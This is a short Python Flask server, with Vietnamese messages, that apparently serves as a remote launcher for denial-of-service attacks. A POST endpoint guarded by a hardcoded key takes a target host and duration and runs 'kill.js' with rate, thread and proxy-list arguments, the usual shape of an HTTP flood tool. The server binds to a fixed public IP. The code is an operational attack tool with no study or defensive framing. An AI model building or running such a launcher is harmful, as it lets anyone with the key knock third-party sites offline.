from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Chào mừng đến với máy chủ của tôi!'

@app.route('/https', methods=['POST'])
def run_child_script():
    key = request.args.get('key')
    if key == 'bvp2007':
        host = request.args.get('host')
        time = request.args.get('time')
        try:
            # Thực thi lệnh để chạy script JavaScript khi API được gọi
            subprocess.Popen(['node', 'kill.js', host, time, '64', '10', 'proxy.txt'])
            return 'Đang chạy script a.js'
        except Exception as e:
            return f'Có lỗi xảy ra: {str(e)}', 500
    else:
        return 'Không có quyền truy cập!', 403

if __name__ == '__main__':
    app.run(host='195.35.20.150', port=9900)